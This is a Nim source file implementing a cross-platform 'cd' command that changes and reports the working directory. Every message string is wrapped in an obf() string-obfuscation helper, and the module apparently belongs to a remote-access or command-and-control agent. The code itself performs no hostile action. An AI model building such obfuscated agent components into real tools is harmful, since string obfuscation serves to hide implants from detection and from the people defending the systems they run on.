#[
    Cross-Platform cd Command
    Changes current working directory
    Compatible with all platforms
]#

import os, strutils
import ../../util/strenc

# Cross-platform cd implementation
proc cd*(args: seq[string]): string =
    try:
        when defined verbose:
            echo obf("DEBUG: Changing directory")
        
        if args.len == 0:
            return obf("ERROR: cd requires a directory argument")
        
        let targetDir = args[0]
        
        when defined verbose:
            echo obf("DEBUG: Changing to directory: ") & targetDir
        
        if not dirExists(targetDir):
            return obf("ERROR: Directory does not exist: ") & targetDir
        
        # Change directory
        setCurrentDir(targetDir)
        
        # Return current directory as confirmation
        let newDir = getCurrentDir()
        
        when defined verbose:
            echo obf("DEBUG: Changed to: ") & newDir
        
        return obf("Changed directory to: ") & newDir
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: cd command failed: ") & e.msg
        return obf("ERROR: cd command failed - ") & e.msg 